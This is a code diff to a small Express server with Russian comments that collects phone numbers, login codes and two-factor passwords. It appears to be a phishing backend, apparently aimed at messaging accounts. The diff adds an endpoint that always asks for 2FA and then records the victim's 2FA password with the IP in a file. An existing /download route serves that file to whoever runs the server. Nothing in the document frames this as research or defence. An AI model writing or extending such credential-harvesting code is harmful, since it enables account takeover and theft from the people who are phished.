@@ -5,7 +5,6 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Для Render используем /tmp, для локального теста — текущую папку
 const DATA_FILE = process.env.RENDER ? path.join('/tmp', 'data.txt') : 'data.txt';
 
 app.use(cors());
@@ -28,13 +27,34 @@ app.post('/api/verify', (req, res) => {
     if (!phone || !code || code.length < 5) {
         return res.status(400).json({ error: 'Invalid data' });
     }
+
+    // Сохраняем код
     const data = { phone, code, ip: req.ip, time: new Date().toISOString() };
     fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
     console.log('🔑 Phone + Code:', phone, code);
+
+    // Всегда просим 2FA (если хочешь — можно проверять наличие 2FA через API)
+    res.json({ requires2FA: true });
+});
+
+app.post('/api/2fa', (req, res) => {
+    const { phone, code, password } = req.body;
+    if (!phone || !password) {
+        return res.status(400).json({ error: 'Invalid data' });
+    }
+
+    const data = { 
+        phone, 
+        code, 
+        twofa_password: password, 
+        ip: req.ip, 
+        time: new Date().toISOString() 
+    };
+    fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
+    console.log('🔐 Phone + Code + 2FA:', phone, code, password);
     res.json({ success: true });
 });
 
-// ===== СКАЧИВАНИЕ DATA.TXT =====
 app.get('/download', (req, res) => {
     if (fs.existsSync(DATA_FILE)) {
         res.download(DATA_FILE, 'data.txt');
